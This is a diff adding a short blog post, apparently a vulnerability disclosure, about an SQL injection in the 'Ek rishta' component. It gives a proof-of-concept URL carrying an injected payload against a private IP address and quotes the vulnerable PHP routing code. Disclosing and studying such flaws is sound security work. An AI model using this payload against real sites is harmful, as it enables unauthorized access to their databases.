@@ -1,0 +1,21 @@
+---
+title: "Sql Injection Ek rishta Component""
+layout: post
+date: 2018-06-11
+categories: vulnerabilities
+---
+
+
+PoC:
+http://172.16.1.253:8080/index.php/home/requested_user/Sent%20interest/1'or%20a%23
+
+Vulnerable Code: file -> router.php
+{% highlight php %}
+	if(!empty($segments[2]) && $segments[0]=='requested_user') {
+		$c_id	= EkrishtaUsrID($segments[2]); 
+		if($segments[1] == "Sent interest")
+			$vars['rid']	= $c_id;
+		else
+			$vars['cid']	= $c_id;
+	}
+{% endhighlight %}
